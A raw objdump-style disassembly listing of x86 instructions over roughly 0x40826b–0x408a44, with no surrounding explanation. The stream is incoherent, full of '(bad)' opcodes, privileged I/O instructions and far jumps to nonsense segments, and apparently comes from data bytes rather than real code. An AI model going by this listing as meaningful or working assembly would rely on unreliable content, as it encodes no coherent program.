  40826b:	mov    DWORD PTR [edi],esi
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x40823a
  408275:	hlt    
  408276:	pusha  
  408277:	dec    ecx
  408278:	push   ds
  408279:	inc    edi
  40827a:	mov    bh,0x90
  40827c:	push   ebp
  40827d:	neg    edx
  40827f:	(bad)  
  408280:	fdiv   QWORD PTR [ebx-0x77]
  408283:	(bad)  
  408285:	adc    BYTE PTR [ebx+0x2afed1d5],bl
  40828b:	inc    ebp
  40828c:	mov    ds:0xb978a8b,al
  408291:	in     al,0x36
  408293:	xchg   edx,eax
  408294:	cmp    DWORD PTR [ecx-0x1b468da4],0x172a93dd
  40829e:	popa   
  40829f:	(bad)
  4082a2:	fidivr WORD PTR [esi+ecx*4]
  4082a5:	xchg   edi,eax
  4082a6:	inc    ebx
  4082a7:	or     DWORD PTR [ebp-0x67262e86],esi
  4082ad:	scas   al,BYTE PTR es:[edi]
  4082ae:	scas   eax,DWORD PTR es:[edi]
  4082af:	add    ch,BYTE PTR [edi]
  4082b1:	int    0xbf
  4082b3:	and    esp,esi
  4082b5:	cmp    al,0xc9
  4082b7:	xchg   edi,eax
  4082b8:	jg     0x4082c7
  4082ba:	sbb    eax,0x23085265
  4082bf:	add    DWORD PTR [ebx+0x21a47d31],ecx
  4082c5:	(bad)  
  4082c6:	popa   
  4082c7:	adc    esp,DWORD PTR [ebp-0x6d51874d]
  4082cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082ce:	xor    BYTE PTR [ecx-0x43],ah
  4082d1:	dec    ebp
  4082d2:	sbb    eax,0xb73f3b5b
  4082d7:	pop    ebp
  4082d8:	jp     0x4082a3
  4082da:	jge    0x408295
  4082dc:	test   BYTE PTR [esi-0x2aa58e51],bh
  4082e2:	inc    eax
  4082e3:	add    al,0x1b
  4082e5:	pop    esi
  4082e6:	js     0x4082be
  4082e8:	jle    0x408291
  4082ea:	out    dx,eax
  4082eb:	pop    eax
  4082ec:	dec    esi
  4082ed:	jns    0x40830f
  4082ef:	cld    
  4082f0:	gs mov dl,0xd2
  4082f3:	xor    al,0x7b
  4082f5:	sub    BYTE PTR [ecx+esi*2],cl
  4082f8:	pop    ecx
  4082f9:	das    
  4082fa:	aas    
  4082fb:	test   DWORD PTR [eax-0x3],ebx
  4082fe:	es jecxz 0x408339
  408301:	inc    ebp
  408302:	out    0xbe,al
  408304:	xchg   ebp,eax
  408305:	test   BYTE PTR [ebp+0x5a056cd2],ah
  40830b:	xor    al,0x93
  40830d:	dec    esi
  40830e:	jp     0x40829d
  408310:	shl    BYTE PTR [ecx-0x104fb603],cl
  408316:	mov    ds:0x64d75689,al
  40831b:	es jecxz 0x40834b
  40831e:	retf   
  40831f:	xchg   bh,al
  408321:	arpl   WORD PTR [ebx-0x7],cx
  408324:	jge    0x408358
  408326:	sti    
  408327:	pop    ax
  408329:	adc    BYTE PTR [edx-0xef4d284],0x12
  408330:	or     DWORD PTR ds:0xc69f5e46,0x21b7531b
  40833a:	mov    al,0xe1
  40833c:	add    eax,0xb3ea83f9
  408341:	adc    cl,dl
  408343:	xor    eax,0x68584ca0
  408348:	stos   DWORD PTR es:[edi],eax
  408349:	mov    ?,WORD PTR [esi+0xe]
  40834c:	inc    ebp
  40834d:	sub    BYTE PTR [ecx],0xe6
  408350:	cld    
  408351:	ret    0x96dc
  408354:	xchg   edx,edi
  408356:	loop   0x40833f
  408358:	aas    
  408359:	inc    edx
  40835a:	sbb    BYTE PTR [edi+edi*1+0x4c75617e],dh
  408361:	push   ebp
  408362:	dec    esi
  408363:	stos   DWORD PTR es:[edi],eax
  408364:	mov    ebx,0x869a4a64
  408369:	mov    dh,0xb
  40836b:	dec    edi
  40836c:	nop
  40836d:	pop    esi
  40836e:	push   edx
  40836f:	sub    BYTE PTR [edi-0x1d928081],0xc0
  408376:	jmp    0x576e:0xd6f04d2
  40837d:	xor    bh,bl
  40837f:	push   es
  408380:	pop    eax
  408381:	and    bl,BYTE PTR [edi+0x3e]
  408384:	add    eax,0xf808a77f
  408389:	retf   
  40838a:	mov    cs,edx
  40838c:	hlt    
  40838d:	pop    edx
  40838e:	pop    edx
  40838f:	sub    eax,0xed261c16
  408394:	ja     0x408360
  408396:	cmc    
  408397:	pop    ebp
  408398:	jno    0x408378
  40839a:	lock mov ch,0xea
  40839d:	push   DWORD PTR [ebp+0x682e5a57]
  4083a3:	pop    esp
  4083a4:	push   ebp
  4083a5:	pop    esp
  4083a6:	push   ebp
  4083a7:	ja     0x4083ff
  4083a9:	std    
  4083aa:	jecxz  0x40839d
  4083ac:	cdq    
  4083ad:	adc    esp,DWORD PTR [ebx+0x55]
  4083b0:	mov    ah,0xc1
  4083b2:	mov    edx,0xba2aadd7
  4083b7:	in     al,dx
  4083b8:	push   ecx
  4083b9:	loop   0x408365
  4083bb:	sub    ecx,edi
  4083bd:	mov    dh,0xc7
  4083bf:	cli    
  4083c0:	scas   al,BYTE PTR es:[edi]
  4083c1:	cmp    cl,BYTE PTR [ebp-0x48043d79]
  4083c7:	pusha  
  4083c8:	push   ss
  4083c9:	in     eax,dx
  4083ca:	loope  0x408363
  4083cc:	xor    eax,0x4af0d6d6
  4083d1:	imul   edi,DWORD PTR [edx],0x2d18cd87
  4083d7:	cdq    
  4083d8:	sbb    edi,DWORD PTR [edi+ebp*8-0xd158abf]
  4083df:	cmp    DWORD PTR [esi-0xa2bcae7],ebx
  4083e5:	fisub  DWORD PTR [ebp-0x28c0d2c4]
  4083eb:	jmp    0xd9e4:0xf24d3f2
  4083f2:	cmc    
  4083f3:	jge    0x408405
  4083f5:	adc    eax,DWORD PTR ds:0x9a204d52
  4083fb:	push   esp
  4083fc:	push   eax
  4083fd:	lock inc dx
  408400:	dec    esi
  408401:	pop    ebp
  408402:	or     al,0x96
  408404:	lods   al,BYTE PTR ds:[esi]
  408405:	stos   BYTE PTR es:[edi],al
  408406:	xchg   edx,eax
  408407:	(bad)  
  408408:	loop   0x408477
  40840a:	and    DWORD PTR [ebp-0x1b],esp
  40840d:	mov    dl,0xa2
  40840f:	jb     0x408431
  408411:	push   eax
  408412:	xor    DWORD PTR [ecx+edx*1],eax
  408415:	mov    eax,ds:0x96e8bf2a
  40841a:	mov    esi,0x2ad9c3e8
  40841f:	iret   
  408420:	call   0x4f46:0xe3fb557c
  408427:	hlt    
  408428:	sub    BYTE PTR [ebx+0x207b1b9a],ah
  40842e:	scas   al,BYTE PTR es:[edi]
  40842f:	shl    DWORD PTR [eax+ebp*2-0x2c1b23f8],cl
  408436:	mov    ecx,0x571a713d
  40843b:	xchg   DWORD PTR [edx-0x4fe258d4],ebx
  408441:	pop    ebp
  408442:	xchg   edi,eax
  408443:	add    BYTE PTR [edi-0x2e],ch
  408446:	or     DWORD PTR [edi+0x35],esp
  408449:	and    ecx,0x35
  40844c:	mov    dh,0x28
  40844e:	lea    esi,[ebx+0x6a4405f]
  408454:	jne    0x4083ef
  408456:	shl    BYTE PTR [ecx+0x346f1485],1
  40845c:	and    DWORD PTR [ebx-0x61],0xc179d12a
  408463:	mov    dh,0xb5
  408465:	je     0x40840d
  408467:	popa   
  408468:	outs   dx,BYTE PTR ds:[esi]
  408469:	(bad)  
  40846a:	or     esp,DWORD PTR [ecx+0x65]
  40846d:	iret   
  40846e:	xor    esi,esi
  408470:	jb     0x4084e8
  408472:	retf   0x786
  408475:	xor    DWORD PTR [ecx+eax*1-0x39cc2c12],ecx
  40847c:	nop
  40847d:	adc    cl,BYTE PTR [esi+esi*4-0x669d47fc]
  408484:	outs   dx,DWORD PTR ds:[esi]
  408485:	jno    0x408505
  408487:	bound  ecx,QWORD PTR [eax+0x1118baa3]
  40848d:	stos   DWORD PTR es:[edi],eax
  40848e:	stos   BYTE PTR es:[edi],al
  40848f:	inc    edi
  408490:	sahf   
  408491:	imul   esp,DWORD PTR [ebp+0x30],0xa5a98a56
  408498:	add    al,BYTE PTR [esi+0x77]
  40849b:	or     DWORD PTR [ecx-0x79],ebp
  40849e:	test   eax,0xfc714ff7
  4084a3:	(bad)  
  4084a4:	mov    ecx,0xe6de5b6c
  4084a9:	sbb    ah,BYTE PTR fs:[eax]
  4084ac:	push   eax
  4084ad:	add    BYTE PTR [eax],bh
  4084af:	ss add edx,ecx
  4084b2:	and    DWORD PTR [ecx],edx
  4084b4:	push   esp
  4084b5:	rcl    ch,1
  4084b7:	ins    BYTE PTR es:[edi],dx
  4084b8:	xlat   BYTE PTR ds:[ebx]
  4084b9:	fimul  WORD PTR [esp+edi*8+0x36a7a8d6]
  4084c0:	ja     0x408466
  4084c2:	xchg   esi,eax
  4084c3:	mov    dl,0x93
  4084c5:	aas    
  4084c6:	mov    edi,0x23648c50
  4084cb:	mov    ds:0x4a666036,eax
  4084d0:	mov    ebx,0x32f91121
  4084d5:	hlt    
  4084d6:	mov    bl,0x2d
  4084d8:	adc    ecx,DWORD PTR [ecx+edx*8-0x7e]
  4084dc:	xchg   edi,eax
  4084dd:	xor    DWORD PTR [edx+ebp*1-0x36],esp
  4084e1:	sub    al,0x72
  4084e3:	mov    bl,0xa2
  4084e5:	rcr    BYTE PTR [edx-0x7e025c8],cl
  4084eb:	(bad)  
  4084ed:	dec    ebp
  4084ee:	ja     0x408524
  4084f0:	inc    esp
  4084f1:	mov    esp,0x9ddbda0e
  4084f6:	pop    ds
  4084f7:	inc    ebx
  4084f8:	retf   0x688d
  4084fb:	mov    eax,0x8564f3f3
  408500:	mov    edi,0x9d5df160
  408505:	cmp    cl,BYTE PTR [ebp+esi*2-0x51055f8f]
  40850c:	ins    BYTE PTR es:[edi],dx
  40850d:	add    BYTE PTR [ebp+0x29],0xcb
  408511:	push   ds
  408512:	mov    eax,ds:0x5a6c549e
  408517:	rcl    BYTE PTR [edi],0xa7
  40851a:	ja     0x40853b
  40851c:	dec    eax
  40851d:	and    al,bh
  40851f:	mov    al,0xda
  408521:	popf   
  408522:	ja     0x4084d4
  408524:	pop    ebp
  408525:	sub    eax,0xa7756e4d
  40852a:	mov    ah,0x51
  40852c:	outs   dx,BYTE PTR ds:[esi]
  40852d:	(bad)  
  40852e:	in     al,dx
  40852f:	fsub   st(1),st
  408531:	sbb    edi,esi
  408533:	push   es
  408534:	mov    DWORD PTR [esi],esp
  408536:	sub    al,0x2
  408538:	rol    DWORD PTR ds:0xff6b1b7a,cl
  40853e:	cdq    
  40853f:	mov    es,WORD PTR [ebp-0x56]
  408542:	scas   eax,DWORD PTR es:[edi]
  408543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408544:	(bad)  
  408545:	fiadd  WORD PTR [edi]
  408547:	dec    edi
  408548:	mov    esp,DWORD PTR [esi]
  40854a:	lock rcl BYTE PTR [esi+0x2e70116],cl
  408551:	lds    ecx,FWORD PTR [edi+eax*1+0x61]
  408555:	outs   dx,BYTE PTR ds:[esi]
  408556:	xchg   ebx,eax
  408557:	test   eax,0x174c5a96
  40855c:	(bad)  
  40855d:	cld    
  40855e:	push   ebp
  40855f:	xor    ch,ah
  408561:	in     al,dx
  408562:	loop   0x4085a1
  408564:	(bad)  
  408565:	out    0x20,eax
  408567:	dec    ebx
  408568:	pop    ebp
  408569:	mov    es,WORD PTR [ecx]
  40856b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40856c:	iret   
  40856d:	xchg   edx,eax
  40856e:	dec    edi
  40856f:	mov    ds:0x48e8ff30,al
  408574:	pop    esi
  408575:	test   al,0x87
  408577:	call   0x85f2:0x5da24717
  40857e:	xor    BYTE PTR [eax+0x36],dl
  408581:	cli    
  408582:	fs stos BYTE PTR es:[edi],al
  408584:	add    ecx,DWORD PTR ds:0x1c3539cd
  40858a:	cmp    BYTE PTR ds:0x383fc6e2,0x54
  408591:	push   ecx
  408592:	dec    esp
  408593:	push   eax
  408594:	(bad)  
  408595:	aam    0xee
  408597:	mov    esp,0x5165b0dd
  40859c:	mov    DWORD PTR [eax-0x11055e06],eax
  4085a2:	or     al,0x4
  4085a4:	mov    BYTE PTR [ecx],al
  4085a6:	jmp    0x4088f3
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0x72176d87
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x40861e
  4085c4:	out    dx,al
  4085c5:	lock rcr ah,1
  4085c8:	pop    edx
  4085c9:	in     eax,dx
  4085ca:	jp     0x4085e9
  4085cc:	add    ebx,DWORD PTR [ebx]
  4085ce:	push   0xe4cbfbf8
  4085d3:	sbb    eax,0x2ff79412
  4085d8:	dec    ebp
  4085d9:	xor    ebp,DWORD PTR [ebp-0x14]
  4085dc:	in     al,dx
  4085dd:	or     al,0xf5
  4085df:	bound  ebx,QWORD PTR [esp+esi*8]
  4085e2:	adc    bx,WORD PTR [edi+0x4a]
  4085e6:	mov    dl,0xb6
  4085e8:	(bad)  
  4085e9:	sbb    dl,BYTE PTR [ecx+0x5]
  4085ec:	ins    DWORD PTR es:[edi],dx
  4085ed:	daa    
  4085ee:	push   ds
  4085ef:	mov    WORD PTR [edi+eax*8],?
  4085f2:	mov    dl,0xd0
  4085f4:	(bad)  
  4085f5:	and    BYTE PTR ds:[edx+0x8],0x1
  4085fa:	leave  
  4085fb:	or     eax,0xe5ee3f5a
  408600:	pop    edx
  408601:	push   eax
  408602:	pop    edx
  408603:	push   ss
  408604:	mov    BYTE PTR [ecx*1+0x45f86981],0x53
  40860c:	dec    edi
  40860d:	dec    ecx
  40860e:	push   cs
  40860f:	fwait
  408610:	jl     0x408608
  408612:	outs   dx,BYTE PTR ds:[esi]
  408613:	repnz out 0x62,eax
  408616:	jmp    0x4085e1
  408618:	cmp    dl,BYTE PTR [esi]
  40861a:	jge    0x4085c8
  40861c:	(bad)  
  40861d:	shr    BYTE PTR [ecx+0x1aeb966b],1
  408623:	scas   eax,DWORD PTR es:[edi]
  408624:	retf   0x32fd
  408627:	test   eax,0x70c8b03
  40862c:	iret   
  40862d:	add    eax,esp
  40862f:	fidivr DWORD PTR [ecx+esi*4+0x6f]
  408633:	mov    ch,0x75
  408635:	xor    esi,DWORD PTR [eax]
  408637:	cmp    al,0x97
  408639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40863a:	dec    esi
  40863b:	inc    ebp
  40863c:	lahf   
  40863d:	js     0x4085f8
  40863f:	jmp    0x88f8:0x810853bb
  408646:	sub    al,0xb6
  408648:	dec    edx
  408649:	nop
  40864a:	jecxz  0x4085d5
  40864c:	icebp  
  40864d:	ucomiss xmm2,DWORD PTR [edi-0x19]
  408651:	sti    
  408652:	dec    esp
  408653:	rcl    DWORD PTR [esi-0x4c],0x52
  408657:	bound  edx,QWORD PTR [edi+0x2b77c5ef]
  40865d:	dec    esi
  40865e:	or     al,0x5
  408660:	mov    ds:0xfd463c58,al
  408665:	inc    ecx
  408666:	and    esp,DWORD PTR [ebx]
  408668:	arpl   WORD PTR [edx-0x4b3e5055],ax
  40866e:	jne    0x4086ab
  408670:	dec    ecx
  408671:	pop    ss
  408672:	jae    0x4085f6
  408674:	sbb    esp,DWORD PTR [ecx+ebx*8+0x3b1eeb99]
  40867b:	jmp    0x7264:0x1f43b44c
  408682:	pop    esp
  408683:	data16 loope 0x408680
  408686:	fist   DWORD PTR [ebp+0x67]
  408689:	xlat   BYTE PTR ds:[ebx]
  40868a:	dec    eax
  40868b:	dec    esi
  40868c:	scas   eax,DWORD PTR es:[edi]
  40868d:	jo     0x40869a
  40868f:	pop    ebp
  408690:	pop    eax
  408691:	and    al,0x44
  408693:	repnz mov bl,bh
  408696:	mov    ch,0xe9
  408698:	pop    es
  408699:	sar    DWORD PTR [bx+di+0x70df],0xdf
  40869f:	into   
  4086a0:	call   0x116c:0xe6543cad
  4086a7:	sbb    BYTE PTR [esi+0x45],bl
  4086aa:	xchg   esp,eax
  4086ab:	int3   
  4086ac:	xchg   BYTE PTR [esi+ebx*8-0x2b915b2e],ah
  4086b3:	and    bl,ah
  4086b5:	pop    esi
  4086b6:	xor    DWORD PTR [ebx+0x505534a5],esp
  4086bc:	cmp    esi,DWORD PTR [ebx]
  4086be:	jne    0x40872a
  4086c0:	mov    ebp,0x27fc2e61
  4086c5:	shl    edi,cl
  4086c7:	enter  0xefe3,0x91
  4086cb:	aaa    
  4086cc:	xchg   ecx,eax
  4086cd:	repz xchg ebp,eax
  4086cf:	sahf   
  4086d0:	pop    edx
  4086d1:	es dec edi
  4086d3:	cs jmp 0xf21b:0xa2af4ee3
  4086db:	push   ecx
  4086dc:	push   es
  4086dd:	iret   
  4086de:	icebp  
  4086df:	add    al,0x5d
  4086e1:	inc    esi
  4086e2:	in     al,0x2
  4086e4:	retf   
  4086e5:	mov    ds:0x9475f3f6,al
  4086ea:	lahf   
  4086eb:	imul   esp,DWORD PTR [edi-0x7d],0x75
  4086ef:	sub    DWORD PTR [esi-0x56aa76e7],0xffffffa0
  4086f6:	je     0x4086fd
  4086f8:	mov    ebp,0x1133fbd4
  4086fd:	inc    ebp
  4086fe:	sbb    esp,ebx
  408700:	shl    DWORD PTR [edi-0x7],1
  408703:	cmp    eax,0xa162bb56
  408708:	jmp    0xce0b:0x52bac19f
  40870f:	shl    dh,1
  408711:	ins    BYTE PTR es:[edi],dx
  408712:	cmp    DWORD PTR [ecx+0x2af6e8ba],edx
  408718:	cdq    
  408719:	push   edx
  40871a:	add    eax,0x8e66123c
  40871f:	(bad)  
  408720:	push   ss
  408721:	or     DWORD PTR [ebx-0x42a0247f],esi
  408727:	daa    
  408728:	inc    ebx
  408729:	mov    ds:0x301eec2a,eax
  40872e:	push   cs
  40872f:	stos   BYTE PTR es:[edi],al
  408730:	inc    ebp
  408731:	push   0xa44ed10f
  408736:	xchg   edi,eax
  408737:	lods   eax,DWORD PTR ds:[esi]
  408738:	xor    al,0x3f
  40873a:	ficomp DWORD PTR [esi+0x1]
  40873d:	(bad)  [edi-0x57]
  408740:	push   ebp
  408741:	mov    dl,0x3b
  408743:	add    eax,0xae7dd158
  408748:	(bad)  [ecx+ebx*1+0x3e2268f6]
  40874f:	outs   dx,BYTE PTR ds:[esi]
  408750:	jnp    0x40873f
  408752:	fs (bad) 
  408754:	adc    bh,BYTE PTR [ebp*1+0x72c40d26]
  40875b:	test   DWORD PTR [edx],0x1cb3093b
  408761:	mov    ch,0xd4
  408763:	(bad)  
  408764:	mov    ch,0x62
  408766:	fidiv  DWORD PTR ds:0x3fc8ac5d
  40876c:	mov    cl,0xfe
  40876e:	dec    esp
  40876f:	mov    ds:0xcfa7f12a,eax
  408774:	rcr    DWORD PTR ds:0xc6a402d5,0xd8
  40877b:	rcr    BYTE PTR [edi-0x2e41287e],0xd0
  408782:	sub    al,0x96
  408784:	js     0x408804
  408786:	iret   
  408787:	sti    
  408788:	and    ecx,esi
  40878a:	mov    ds:0xe926f132,al
  40878f:	inc    edx
  408790:	dec    edx
  408791:	pop    esp
  408792:	sbb    BYTE PTR [eax+0x328e57c8],0x6c
  408799:	test   DWORD PTR [ebp-0x64],edx
  40879c:	mov    esi,0x6d1ca648
  4087a1:	arpl   WORD PTR es:[edi-0x1441dd24],dx
  4087a8:	out    0x0,eax
  4087aa:	jecxz  0x408763
  4087ac:	cdq    
  4087ad:	imul   ebp,DWORD PTR [edx],0xfffffffe
  4087b0:	setl   al
  4087b3:	aad    0x53
  4087b5:	sub    eax,0xf1152662
  4087ba:	lahf   
  4087bb:	jg     0x4087f8
  4087bd:	fucomp st(7)
  4087bf:	ret    0xc791
  4087c2:	fdiv   QWORD PTR [eax]
  4087c4:	cmp    DWORD PTR [ecx+0x6a647d5a],eax
  4087ca:	enter  0x5db5,0xe9
  4087ce:	push   ax
  4087d0:	clc    
  4087d1:	repnz push esi
  4087d3:	sub    BYTE PTR [edi],bh
  4087d5:	in     al,0x55
  4087d7:	scas   eax,DWORD PTR es:[edi]
  4087d8:	in     al,0x50
  4087da:	push   edx
  4087db:	mov    al,al
  4087dd:	stos   DWORD PTR es:[edi],eax
  4087de:	test   eax,0xf185af6e
  4087e3:	mov    ch,0x24
  4087e5:	sub    eax,0x17ee42ae
  4087ea:	fst    DWORD PTR [ebx-0x77]
  4087ed:	inc    esp
  4087ee:	clc    
  4087ef:	jnp    0x4087e3
  4087f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087f2:	sbb    ah,0xc
  4087f5:	loope  0x4087dd
  4087f7:	enter  0x620b,0x46
  4087fb:	push   esi
  4087fc:	mov    bh,0xcc
  4087fe:	hlt    
  4087ff:	sldt   WORD PTR [edi-0x35dec152]
  408806:	or     al,0x2f
  408808:	cdq    
  408809:	dec    ebp
  40880a:	mov    BYTE PTR [ebx],cl
  40880c:	aas    
  40880d:	sbb    al,dl
  40880f:	lahf   
  408810:	sbb    ch,al
  408812:	push   ebx
  408813:	loop   0x408839
  408815:	inc    esp
  408816:	xchg   ebp,eax
  408817:	mov    ebx,0xd973e203
  40881c:	pop    esp
  40881d:	cmc    
  40881e:	and    al,0x8d
  408820:	or     ecx,DWORD PTR [ecx+0x73]
  408823:	repnz adc BYTE PTR [esi],al
  408826:	div    ah
  408828:	sti    
  408829:	mov    ecx,0x3a0954b6
  40882e:	call   0xcc229fb5
  408833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408834:	mov    ss,WORD PTR [ecx]
  408836:	inc    edi
  408837:	mov    dl,0xbd
  408839:	pop    ebx
  40883a:	jg     0x408878
  40883c:	lock dec edi
  40883e:	pop    eax
  40883f:	cmp    ecx,DWORD PTR [esi+0x2e]
  408842:	stc    
  408843:	fwait
  408844:	sar    BYTE PTR [edx-0x48],1
  408847:	sub    al,0xc0
  408849:	xchg   ebx,eax
  40884a:	inc    eax
  40884b:	js     0x408834
  40884d:	ds stos BYTE PTR es:[edi],al
  40884f:	xor    ecx,ebp
  408851:	xchg   BYTE PTR [esi],ch
  408853:	push   ebx
  408854:	adc    bl,BYTE PTR ds:0xe51dd513
  40885a:	cmp    al,0xc1
  40885c:	(bad)  
  40885d:	je     0x4088d7
  40885f:	ins    DWORD PTR es:[edi],dx
  408860:	sub    BYTE PTR ss:[edx+0x45],dl
  408864:	adc    eax,0xb35065f6
  408869:	add    ah,BYTE PTR [ecx+edi*2-0x2d]
  40886d:	mov    esi,0xde54b9b9
  408872:	fmul   QWORD PTR [ecx-0x78]
  408875:	aaa    
  408876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408877:	add    DWORD PTR [eax+0x2d9897f3],ecx
  40887d:	sub    al,0x75
  40887f:	aaa    
  408880:	shl    BYTE PTR [edi-0xd23fb2e],1
  408886:	bound  ecx,QWORD PTR [esi]
  408888:	cmp    cl,BYTE PTR [esi+0x1e]
  40888b:	add    BYTE PTR [edi-0xa],dl
  40888e:	or     esp,esp
  408890:	jge    0x408852
  408892:	mov    esi,0xa88fb0a9
  408897:	shl    DWORD PTR [ecx],0x0
  40889a:	(bad)  
  40889b:	arpl   WORD PTR [ebx+0x364f5ad2],ax
  4088a1:	loopne 0x4088f4
  4088a3:	adc    bh,BYTE PTR [eax]
  4088a5:	inc    ebx
  4088a6:	cmp    eax,0x33895462
  4088ab:	cmp    DWORD PTR [eax-0x6772cddc],eax
  4088b1:	sbb    DWORD PTR [ebx],ebx
  4088b3:	pop    edx
  4088b4:	add    BYTE PTR [edi+edi*2+0xe],bl
  4088b8:	stos   DWORD PTR es:[edi],eax
  4088b9:	dec    ecx
  4088ba:	pop    esp
  4088bb:	fucomp st(4)
  4088bd:	cmp    DWORD PTR [edi+0x8611c58],esi
  4088c3:	dec    ebx
  4088c4:	sar    BYTE PTR ds:0xcecdde7f,0x7b
  4088cb:	(bad)  
  4088cc:	lods   al,BYTE PTR ds:[esi]
  4088cd:	sub    esi,edi
  4088cf:	pop    edx
  4088d0:	push   0x26
  4088d2:	push   esp
  4088d3:	mov    bl,0xe1
  4088d5:	jge    0x40888a
  4088d7:	test   edx,ebp
  4088d9:	ja     0x408937
  4088db:	icebp  
  4088dc:	fmul   st,st(1)
  4088de:	xchg   edi,eax
  4088df:	mov    ecx,0xd6de4b0d
  4088e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088e5:	fcmovne st,st(7)
  4088e7:	(bad)  
  4088e8:	neg    DWORD PTR [esi+0x22]
  4088eb:	arpl   WORD PTR [edx-0x2f899b9f],ax
  4088f1:	sbb    esp,DWORD PTR [ebp-0x107ba73]
  4088f7:	add    BYTE PTR [eax+0x50],al
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp+0x4a435cff],cl
  40890c:	adc    BYTE PTR [edi],al
  40890e:	dec    eax
  40890f:	xchg   edi,eax
  408910:	fdiv   QWORD PTR [eax+0x70]
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x408917
  408918:	lds    ebp,FWORD PTR [esi]
  40891a:	mov    ebp,0xc550f282
  40891f:	add    esp,edi
  408921:	(bad)  
  408922:	jmp    0x408928
  408924:	jnp    0x4088ba
  408926:	in     eax,0x77
  408928:	sbb    al,0xd3
  40892a:	inc    ebx
  40892b:	xchg   ecx,eax
  40892c:	repz and DWORD PTR [ebp-0x38],edi
  408930:	dec    edx
  408931:	stos   BYTE PTR es:[edi],al
  408932:	aam    0x4e
  408934:	pushf  
  408935:	sahf   
  408936:	imul   edi,DWORD PTR [ebp-0x39],0x87f69975
  40893d:	mov    ch,0xe8
  40893f:	mov    ds,WORD PTR [ebp-0x54]
  408942:	sbb    ch,BYTE PTR [edi-0x39]
  408945:	jns    0x408993
  408947:	or     BYTE PTR ds:0x788aec14,bh
  40894d:	std    
  40894e:	add    eax,0x81a3a037
  408953:	(bad)  
  408955:	js     0x40896b
  408957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408958:	rol    ebp,cl
  40895a:	dec    ebx
  40895b:	stos   DWORD PTR es:[edi],eax
  40895c:	pop    edx
  40895d:	std    
  40895e:	dec    edi
  40895f:	jbe    0x408903
  408961:	cmp    BYTE PTR [esi],ch
  408963:	repnz mov ecx,0x4af38006
  408969:	xchg   esp,eax
  40896a:	xor    BYTE PTR [edx-0x70],bh
  40896d:	in     al,dx
  40896e:	xor    BYTE PTR [ebp-0x15],al
  408971:	dec    esp
  408972:	dec    esi
  408973:	mov    dl,0xa1
  408975:	(bad)  [esi+0x1b]
  408978:	sub    al,0x90
  40897a:	and    dl,BYTE PTR [esi+0x23]
  40897d:	mov    eax,0xd558d67b
  408982:	(bad)  
  408984:	push   esp
  408985:	das    
  408986:	cli    
  408987:	xor    DWORD PTR [ebx],edx
  408989:	mov    WORD PTR [eax-0x6e9f66b7],?
  40898f:	or     cl,ah
  408991:	push   0x5c
  408993:	test   eax,0x1d305a6
  408998:	add    eax,0xb98b6f35
  40899d:	test   eax,0x8d4683b
  4089a2:	pop    edi
  4089a3:	loop   0x408a07
  4089a5:	xor    edi,DWORD PTR [eax+0x63]
  4089a8:	fs test al,0x47
  4089ab:	mov    ah,BYTE PTR [edx]
  4089ad:	daa    
  4089ae:	cmp    BYTE PTR [edx-0x77],0xce
  4089b2:	push   esi
  4089b3:	daa    
  4089b4:	popa   
  4089b5:	into   
  4089b6:	cmp    DWORD PTR ds:0x53133311,ebx
  4089bc:	into   
  4089bd:	jmp    0xd10489d5
  4089c2:	fld    QWORD PTR [ebx+0x56aacf2c]
  4089c8:	ror    cl,cl
  4089ca:	inc    edi
  4089cb:	mov    al,dl
  4089cd:	xchg   edi,eax
  4089ce:	mov    edx,0x5e421f0e
  4089d3:	loop   0x408a44
  4089d5:	jbe    0x408a2a
  4089d7:	ret    0x5ae4
  4089da:	jmp    0xce4e6b45
  4089df:	sar    BYTE PTR [ebx],1
  4089e1:	loop   0x4089c7
  4089e3:	mov    dl,0xb4
  4089e5:	dec    eax
  4089e6:	sbb    BYTE PTR [edx-0x2d],dl
  4089e9:	loope  0x4089d0
  4089eb:	or     eax,0x9118bde7
  4089f0:	gs punpckhwd mm2,mm7
  4089f4:	dec    ebx
  4089f5:	shl    DWORD PTR [eax-0xa],0xdc
  4089f9:	popa   
  4089fa:	mov    edi,0xa137f6c2
  4089ff:	inc    ecx
  408a00:	adc    eax,0xbaa9d98e
  408a05:	(bad)
  408a08:	inc    esp
  408a09:	ja     0x408a89
  408a0b:	dec    ecx
  408a0c:	outs   dx,DWORD PTR ds:[esi]
  408a0d:	sub    cl,0x9a
  408a10:	ins    BYTE PTR es:[edi],dx
  408a11:	test   BYTE PTR [edx],dl
  408a13:	test   al,0x8d
  408a15:	and    al,0xd8
  408a17:	push   edi
  408a18:	jp     0x408a3c
  408a1a:	ret    0xbeee
  408a1d:	add    BYTE PTR gs:[ecx-0x15],0x82
  408a22:	ja     0x408a38
  408a24:	dec    esi
  408a25:	xchg   DWORD PTR [eax],edi
  408a27:	neg    bl
  408a29:	push   0xfffffff3
  408a2b:	ins    DWORD PTR es:[edi],dx
  408a2c:	push   0x47
  408a2e:	dec    ebp
  408a2f:	stos   BYTE PTR es:[edi],al
  408a30:	in     al,dx
  408a31:	mov    ch,0xfa
  408a33:	pop    edx
  408a34:	test   BYTE PTR [esi],ch
  408a36:	je     0x4089c2
  408a38:	mov    al,0x20
  408a3a:	aam    0x9
  408a3c:	push   ds
  408a3d:	add    edx,DWORD PTR [ebx+0x4092b1b9]
  408a43:	xchg   ebx,eax
  408a44:	not    BYTE PTR [esi]
